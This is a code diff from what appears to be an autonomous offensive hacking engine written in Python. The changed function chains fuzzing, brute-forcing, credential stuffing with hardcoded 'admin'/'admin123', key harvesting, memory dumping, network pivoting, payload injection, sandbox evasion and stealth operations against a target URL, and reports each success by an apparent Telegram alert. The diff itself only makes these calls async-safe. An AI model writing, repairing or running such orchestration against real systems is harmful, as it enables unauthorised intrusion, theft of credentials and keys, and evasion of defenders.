@@ -543,15 +543,19 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     # ==========================================================
     section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.7)")
     try:
-        # 1. API Fuzzer
-        fuzzer_res = await asyncio.to_thread(run_api_fuzzer, target_url)
-        if fuzzer_res:
-            dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
+        # 1. API Fuzzer (Safe async execution)
+        if asyncio.iscoroutinefunction(run_api_fuzzer):
+            await run_api_fuzzer(target_url)
+        else:
+            await asyncio.to_thread(run_api_fuzzer, target_url)
+        dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
 
-        # 2. Brute Force Engine
-        brute_res = await asyncio.to_thread(execute_brute_force, target_url)
-        if brute_res:
-            dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
+        # 2. Brute Force Engine (Safe async execution)
+        if asyncio.iscoroutinefunction(execute_brute_force):
+            await execute_brute_force(target_url)
+        else:
+            await asyncio.to_thread(execute_brute_force, target_url)
+        dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
 
         # 3. Cloud Metadata & Apex Auditor
         cloud_res = audit_cloud_metadata(target_url)
@@ -564,12 +568,21 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
 
         # 5. Memory Dumper & Form Stuffer
-        dumper_res = execute_memory_dumper(target_url)
-        stuffer_res = execute_form_stuffing(target_url)
+        execute_memory_dumper(target_url)
+        if asyncio.iscoroutinefunction(execute_form_stuffing):
+            await execute_form_stuffing(target_url, "admin", "admin123")
+        else:
+            try:
+                execute_form_stuffing(target_url, "admin", "admin123")
+            except TypeError:
+                execute_form_stuffing(target_url)
 
         # 6. Key Harvester & Pivot Routing
-        keys_res = harvest_keys(target_url)
-        pivot_res = execute_pivot_routing(target_url)
+        harvest_keys(target_url)
+        if asyncio.iscoroutinefunction(execute_pivot_routing):
+            await execute_pivot_routing(target_url)
+        else:
+            execute_pivot_routing(target_url)
 
         # 7. Adaptive Replayer & Payload Mutation
         replayer_res = await replay_and_inject_payloads(target_url)
@@ -578,7 +591,10 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
         # 8. Sandbox Evader & Stealth Operations
         evade_sandbox()
-        execute_stealth_operations(target_url)
+        if asyncio.iscoroutinefunction(execute_stealth_operations):
+            await execute_stealth_operations(target_url)
+        else:
+            execute_stealth_operations(target_url)
 
     except Exception as exc:
         error(f"Comprehensive offensive modules execution warning: {exc}")
@@ -739,4 +755,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         warning("Engine interrupted by operator.")
     except Exception as exc:
-        error(f"Engine crashed: {exc}")
+        error(f"Fatal engine error: {exc}")
